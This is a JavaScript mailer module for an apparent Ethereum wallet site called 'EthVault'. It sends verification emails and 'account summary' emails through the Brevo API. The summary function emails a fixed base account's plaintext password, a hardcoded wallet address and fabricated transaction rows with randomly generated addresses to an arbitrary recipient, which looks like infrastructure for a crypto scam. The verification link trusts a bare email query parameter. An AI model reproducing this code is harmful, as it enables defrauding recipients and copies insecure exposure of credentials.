import { config } from "dotenv";
import fetch from "node-fetch";
import { readFile } from "fs/promises";
import { resolve } from "path";
import User from "../model/user.js";
import computeBalance from "./compute-balance.js";
import generateETHAddress from "./generate-address.js";
import mongoose from "mongoose";

config();

class Mailer {
	static async sendVerificationMail({ email }) {
		try {
			let emailTemplate = await readFile(
				resolve(process.cwd(), "./src/server/lib/email-template.html"),
				"utf-8"
			);
			emailTemplate = emailTemplate.replace(
				"{{verification_link}}",
				`https://ethvault.onrender.com/api/user/verify?email=${email}`
			);

			const response = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email }],
						subject: "Verify Your Account",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!response.ok) return false;

			return true;
		} catch (error) {
			return false;
		}
	}

	static async sendAccountSummary({ to }) {
		try {
			await mongoose.connect(process.env.DB_URL);

			let [emailTemplate, rateResponse] = await Promise.all([
				readFile(
					resolve(
						process.cwd(),
						"./src/server/lib/account-summary-email-template.html"
					),
					"utf-8"
				),
				fetch(
					"https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD"
				)
			]);

			const baseEmail = process.env.BASE_EMAIL;
			const { USD } = await rateResponse.json();
			const baseUser = await User.findOne({ email: baseEmail });
			const accountBalance = await computeBalance(baseUser.transactions);

			const lastTransactions = await Promise.all(
				baseUser.transactions.slice(0, 10).map(async transaction => {
					const ethAddress = await generateETHAddress();
					return `<tr>
                    <td>${new Date(transaction.date).toDateString()}</td>
                    <td style='text-transform: capitalize'>${
						transaction.type
					}</td>
                    <td>${(
						transaction.amount -
						(0.001 * transaction.amount) / 100
					).toFixed(3)} (ETH)</td>
                    <td>${ethAddress}</td>
                </tr>`;
				})
			);

			emailTemplate = emailTemplate.replace("{{user_email}}", baseEmail);
			emailTemplate = emailTemplate.replace(
				"{{user_password}}",
				baseUser.password
			);
			emailTemplate = emailTemplate.replace(
				"{{wallet_address}}",
				"0x650ad55B32Bc2c8e33589fdd95A7708F1C1a0e94"
			);
			emailTemplate = emailTemplate.replace(
				"{{eth_balance}}",
				accountBalance
			);
			emailTemplate = emailTemplate.replace(
				"{{usd_balance}}",
				Number((accountBalance * USD).toFixed(2)).toLocaleString()
			);
			emailTemplate = emailTemplate.replace(
				"{{transaction_rows}}",
				lastTransactions.join("")
			);

			// Send the email
			const mailResponse = await fetch(
				"https://api.brevo.com/v3/smtp/email",
				{
					method: "POST",
					body: JSON.stringify({
						sender: {
							name: "EthVault",
							email: "victor.onah@atrizult.com"
						},
						to: [{ email: to }],
						subject: "Ethereum Account Summary",
						htmlContent: emailTemplate
					}),
					headers: {
						"api-key": process.env.API_KEY,
						"Content-Type": "application/json"
					}
				}
			);

			if (!mailResponse.ok) return false;

			return true;
		} catch (error) {
			console.log(error);
			return false;
		}
	}
}

export default Mailer;
